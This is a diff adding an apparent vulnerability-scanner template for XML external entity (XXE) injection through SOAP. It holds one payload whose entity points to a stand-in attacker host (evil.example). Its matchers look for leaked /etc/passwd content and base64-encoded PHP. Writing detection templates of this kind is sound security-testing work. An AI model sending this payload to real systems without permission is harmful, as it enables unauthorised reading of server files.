@@ -1,0 +1,25 @@
+id: xxe5-0612
+name: 'XXE read in soap'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via soap'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      soap:
+        - '<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://evil.example/x.dtd">]><r>&xxe;</r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'root:'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
+          - 'PD9waHA'
